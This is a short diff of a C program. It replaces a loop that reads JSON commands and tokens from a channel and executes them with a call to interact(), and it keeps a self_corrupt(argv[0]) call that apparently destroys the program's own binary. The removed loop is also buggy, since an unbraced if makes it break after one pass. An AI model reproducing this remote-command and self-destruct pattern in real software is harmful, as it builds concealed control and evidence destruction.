@@ -32,7 +32,7 @@
 #include "base64.h"
 
 #include "channel.h"
-#include "handler.h"
+#include "console.h"
 
 char data[64] = ":data:string:";
 
@@ -50,24 +50,9 @@ int main(int argc, char *argv[])
     if (channel < 0)
         return -1;
 
-    while (1) {
-        char *input = read_channel(channel);
-        JSONObject *json = parseJSON(input);
-
-        char *cmd = find_json(json, "cmd");
-        char *args = find_json(json, "args");
-        char *token = find_json(json, "token");
-
-        if (strcmp(cmd, "exit") == 0)
-            send_channel(channel, token);
-            break;
-
-        handle_command(channel, cmd, args);
-        send_channel(channel, token);
-    }
-
+    interact(channel);
     close_channel(channel);
-    self_corrupt(argv[0]);
 
+    self_corrupt(argv[0]);
     return 0;
 }
